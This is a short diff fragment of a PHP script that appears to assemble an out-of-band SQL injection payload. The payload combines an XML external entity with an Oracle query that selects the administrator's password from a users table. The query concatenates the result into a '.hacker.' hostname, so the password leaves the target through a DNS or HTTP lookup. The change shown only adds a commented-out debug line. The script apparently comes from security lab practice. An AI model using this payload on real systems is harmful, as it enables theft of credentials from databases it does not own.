@@ -14,6 +14,8 @@ $d .= "'||(SELECT password FROM users WHERE username='administrator')||'.hacker.
 $d .= '"> %remote;]>';
 $d .= "'),'/l') FROM dual-- -";
 
+//echo json_encode($_POST).'<br/>';
+
 if (isset($_POST['sql'])) {
     $me = $_POST['sql'];
 } else {
